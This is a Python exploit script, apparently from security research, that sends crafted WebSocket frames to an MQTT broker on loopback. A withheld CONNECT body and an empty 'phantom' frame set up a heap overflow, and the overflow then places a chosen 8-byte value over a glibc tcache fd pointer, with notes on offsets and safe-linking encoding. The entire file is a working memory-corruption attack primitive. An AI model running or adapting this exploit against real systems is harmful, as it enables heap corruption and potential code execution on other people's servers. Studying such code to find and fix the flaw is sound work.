#!/usr/bin/env python3
"""MASKerade Stage B wire probe: place an arbitrary 8-byte value at a
chosen offset in the 256-byte overflow stream. Loopback only.

Observed on the stock-glibc 2.1.2 build (build-glibc.sh): payload is a
0x20 chunk; the next chunks are live 0x30 tcache entries. With the
default --write-len 256 and --fill 41, the stream starts at payload+4;
offset 76 therefore writes the 8 bytes at payload+80, the fd field of
the adjacent 0x30 tcache head chunk. The default --fd-value is only an
example: safe-linking requires fd = (fd_address >> 12) ^ target, which
depends on the runtime heap address. Obtain that address under gdb; the
wire probe proves placement, not that the encoded value is correct.
"""
import argparse
import socket
import struct
import time

MASK = b"\x11\x22\x33\x44"


def masked_frame(opcode, payload):
    n = len(payload)
    if n < 126:
        hdr = bytes((0x80 | opcode, 0x80 | n))
    elif n < 65536:
        hdr = bytes((0x80 | opcode, 0xFE)) + struct.pack("!H", n)
    else:
        hdr = bytes((0x80 | opcode, 0xFF)) + struct.pack("!Q", n)
    body = bytes(b ^ MASK[i % 4] for i, b in enumerate(payload))
    return hdr + MASK + body


def handshake(sock, host, port):
    req = (
        f"GET /mqtt HTTP/1.1\r\nHost: {host}:{port}\r\n"
        "Upgrade: websocket\r\nConnection: Upgrade\r\n"
        "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
        "Sec-WebSocket-Version: 13\r\nSec-WebSocket-Protocol: mqtt\r\n\r\n"
    ).encode()
    sock.sendall(req)
    sock.settimeout(3)
    data = b""
    while b"\r\n\r\n" not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
    return data


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, required=True)
    ap.add_argument("--fd-offset", type=int, default=76,
                    help="offset in the overflow stream (stream starts at payload+4)")
    ap.add_argument("--fd-value", default="4141414141414141",
                    help="little-endian hex bytes to place at --fd-offset")
    ap.add_argument("--write-len", type=int, default=256)
    ap.add_argument("--fill", default="41")
    ap.add_argument("--delay", type=float, default=0.25)
    a = ap.parse_args()

    s = socket.create_connection(("127.0.0.1", a.port), timeout=5)
    hs = handshake(s, "127.0.0.1", a.port)
    print("handshake:", hs.split(b"\r\n")[0].decode(errors="replace"))
    if b"101" not in hs.split(b"\r\n")[0]:
        print("UPGRADE FAILED", repr(hs[:200]))
        s.close()
        return

    stream = bytearray(bytes.fromhex(a.fill) * a.write_len)
    val = bytes.fromhex(a.fd_value)
    stream[a.fd_offset:a.fd_offset + len(val)] = val
    print("placed", val.hex(), "at stream offset", a.fd_offset)

    time.sleep(a.delay)
    s.sendall(masked_frame(0x82, b"\x10\x01"))       # CONNECT header, body withheld
    time.sleep(a.delay)
    s.sendall(masked_frame(0x82, b""))               # phantom 4 bytes
    time.sleep(a.delay)
    s.sendall(masked_frame(0x82, bytes(stream)))     # overflow
    time.sleep(a.delay)
    s.settimeout(2)
    try:
        print("post-trigger recv:", repr(s.recv(4096)[:80]))
    except Exception as e:
        print("post-trigger recv exception:", type(e).__name__)
    s.close()
    print("probe sent")


if __name__ == "__main__":
    main()
